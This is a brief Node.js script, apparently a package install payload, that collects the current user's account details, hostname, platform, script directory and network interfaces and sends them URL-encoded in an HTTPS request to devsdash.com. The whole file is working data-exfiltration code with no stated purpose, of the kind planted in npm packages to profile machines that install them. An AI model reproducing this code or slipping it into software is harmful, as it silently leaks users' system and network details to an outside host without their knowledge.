var os = require("os");
var path = require("path");
var user = os.userInfo();
var host = os.hostname();
var network = os.networkInterfaces();
var platform = os.platform();
var dirpath = path.dirname(__filename);

var dataObj = JSON.stringify({
  user: user,
  host: host,
  platform: platform,
  dirpath: dirpath,
  network: network,
});

var data = encodeURI(dataObj);

const https = require("https");
const options = {
  hostname: "devsdash.com",
  port: 443,
  path: "/curl3.php?data=" + data,
  method: "GET",
};

const req = https.request(options);
req.end();
